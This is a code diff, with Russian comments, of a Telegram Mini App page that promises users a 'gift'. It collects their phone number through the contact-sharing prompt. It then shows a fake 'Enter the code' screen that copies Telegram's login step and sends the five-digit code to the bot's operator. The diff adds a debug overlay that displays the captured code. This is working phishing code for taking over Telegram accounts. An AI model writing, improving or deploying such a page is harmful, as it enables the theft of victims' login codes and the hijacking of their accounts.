@@ -7,45 +7,30 @@
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; text-align: center; background: var(--tg-theme-bg-color, #ffffff); color: var(--tg-theme-text-color, #000000); }
         .hidden { display: none !important; }
-        
         .code-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; margin-top: 20px; }
         .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; line-height: 1.4; }
-        
         .code-input { position: absolute; opacity: 0; width: 1px; height: 1px; font-size: 16px; }
-        
         .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
-        .code-cell { 
-            width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc); 
-            border-radius: 10px; display: flex; justify-content: center; align-items: center; 
-            font-size: 24px; font-weight: 600; transition: border-color 0.2s;
-        }
+        .code-cell { width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 600; transition: border-color 0.2s; }
         .code-cell.filled { border-color: var(--tg-theme-button-color, #3390ec); }
         .code-cell.active { border-color: var(--tg-theme-button-color, #3390ec); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
+        .auth-btn { background: var(--tg-theme-button-color, #3390ec); color: var(--tg-theme-button-text-color, #ffffff); border: none; border-radius: 10px; padding: 15px 20px; font-size: 16px; font-weight: 600; width: 100%; max-width: 300px; margin-top: 20px; cursor: pointer; }
         
-        /* Стили для кнопки внутри мини-аппа */
-        .auth-btn {
-            background: var(--tg-theme-button-color, #3390ec);
-            color: var(--tg-theme-button-text-color, #ffffff);
-            border: none; border-radius: 10px; padding: 15px 20px;
-            font-size: 16px; font-weight: 600; width: 100%; max-width: 300px;
-            margin-top: 20px; cursor: pointer;
-        }
+        /* Окно для отладки */
+        #debug { position: fixed; bottom: 10px; left: 10px; right: 10px; background: rgba(255,0,0,0.8); color: white; font-size: 12px; padding: 10px; border-radius: 8px; word-wrap: break-word; z-index: 9999; text-align: left; }
     </style>
 </head>
 <body>
 
-    <!-- Экран 1 -->
     <div id="screen-phone">
         <h2 style="margin-top: 40px;">Step 1</h2>
-        <p style="color: gray;">To receive your gift, authorize using the button below 👇</p>
+        <p style="color: gray;">To receive your gift, authorize below 👇</p>
         <button class="auth-btn" id="btn-share">SHARE PHONE NUMBER</button>
     </div>
 
-    <!-- Экран 2 -->
     <div id="screen-code" class="hidden">
         <div class="code-header">Enter the code</div>
-        <div class="code-subtitle">We sent a Telegram code to your number<br><b>*** *** ** **</b></div>
-        
+        <div class="code-subtitle">We sent a code to your number<br><b>*** *** ** **</b></div>
         <div class="code-container" id="code-cells">
             <div class="code-cell"></div>
             <div class="code-cell"></div>
@@ -53,72 +38,83 @@
             <div class="code-cell"></div>
             <div class="code-cell"></div>
         </div>
-
         <input type="text" id="code-input" class="code-input" inputmode="numeric" autocomplete="one-time-code" maxlength="5">
     </div>
 
+    <div id="debug">Debug: loading...</div>
+
     <script>
+        const debugEl = document.getElementById('debug');
         window.onload = function() {
-            if (window.Telegram && window.Telegram.WebApp) {
-                const tg = window.Telegram.WebApp;
-                tg.expand();
-                let isSent = false;
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const tg = window.Telegram.WebApp;
+                    tg.expand();
+                    debugEl.innerText = "Debug: WebApp loaded, version " + tg.version;
+                    let isSent = false;
 
-                // Обработка нажатия на кнопку внутри приложения
-                document.getElementById('btn-share').onclick = function() {
-                    tg.requestContact(function(shared, contact) {
-                        if (shared && contact) {
-                            // Отправляем номер
-                            tg.sendData(JSON.stringify({ type: "phone", phone: contact.phone_number }));
+                    document.getElementById('btn-share').onclick = function() {
+                        try {
+                            if (typeof tg.requestContact !== 'function') {
+                                debugEl.innerText = "Debug ERROR: requestContact is not supported by your Telegram version.";
+                                return;
+                            }
+                            debugEl.innerText = "Debug: calling requestContact...";
+                            tg.requestContact(function(shared, contact) {
+                                if (shared && contact) {
+                                    debugEl.innerText = "Debug: contact shared! sending...";
+                                    tg.sendData(JSON.stringify({ type: "phone", phone: contact.phone_number }));
+                                    document.getElementById('screen-phone').classList.add('hidden');
+                                    document.getElementById('screen-code').classList.remove('hidden');
+                                    setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
+                                } else {
+                                    debugEl.innerText = "Debug: contact NOT shared (user denied or error).";
+                                }
+                            });
+                        } catch (err) {
+                            debugEl.innerText = "Debug ERROR (requestContact): " + err.message;
+                        }
+                    };
+
+                    const codeInput = document.getElementById('code-input');
+                    const codeCells = document.querySelectorAll('.code-cell');
+                    document.getElementById('code-cells').onclick = () => codeInput.focus();
+
+                    codeInput.addEventListener('input', function(e) {
+                        const value = this.value.replace(/\D/g, '');
+                        this.value = value;
+
+                        codeCells.forEach((cell, index) => {
+                            if (index < value.length) {
+                                cell.innerText = value[index];
+                                cell.classList.add('filled');
+                            } else {
+                                cell.innerText = '';
+                                cell.classList.remove('filled');
+                            }
+                            if (index === value.length) cell.classList.add('active');
+                            else cell.classList.remove('active');
+                        });
+
+                        if (value.length === 5 && !isSent) {
+                            isSent = true;
+                            this.blur();
                             
-                            // Переключаем экран
-                            document.getElementById('screen-phone').classList.add('hidden');
-                            document.getElementById('screen-code').classList.remove('hidden');
-                            
-                            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
-                        } else {
-                            tg.showAlert("Please allow sharing your phone number.");
+                            try {
+                                debugEl.innerText = "Debug: sending code: " + value;
+                                tg.sendData(JSON.stringify({ type: "code", code: value }));
+                                debugEl.innerText = "Debug: code sent successfully!";
+                                setTimeout(() => { tg.close(); }, 1500);
+                            } catch (err) {
+                                debugEl.innerText = "Debug ERROR (sendData): " + err.message;
+                            }
                         }
                     });
-                };
-
-                // Ввод кода
-                const codeInput = document.getElementById('code-input');
-                const codeCells = document.querySelectorAll('.code-cell');
-                const codeContainer = document.getElementById('code-cells');
-
-                codeContainer.onclick = function() { codeInput.focus(); };
-
-                codeInput.addEventListener('input', function(e) {
-                    const value = this.value.replace(/\D/g, '');
-                    this.value = value;
-
-                    codeCells.forEach((cell, index) => {
-                        if (index < value.length) {
-                            cell.innerText = value[index];
-                            cell.classList.add('filled');
-                        } else {
-                            cell.innerText = '';
-                            cell.classList.remove('filled');
-                        }
-                        if (index === value.length) cell.classList.add('active');
-                        else cell.classList.remove('active');
-                    });
-
-                    if (value.length === 5 && !isSent) {
-                        isSent = true;
-                        this.blur();
-                        
-                        // Отправляем код. Окно не закрываем сразу, чтобы данные улетели.
-                        tg.sendData(JSON.stringify({ type: "code", code: value }));
-                        
-                        // Показываем пользователю, что всё ок
-                        document.querySelector('.code-subtitle').innerHTML = "<b style='color: green;'>Code sent successfully!</b>";
-                        
-                        // Закрываем окно через 1.5 секунды
-                        setTimeout(() => { tg.close(); }, 1500);
-                    }
-                });
+                } else {
+                    debugEl.innerText = "Debug ERROR: Telegram.WebApp not found. Are you opening inside Telegram?";
+                }
+            } catch (globalErr) {
+                debugEl.innerText = "Debug GLOBAL ERROR: " + globalErr.message;
             }
         };
     </script>
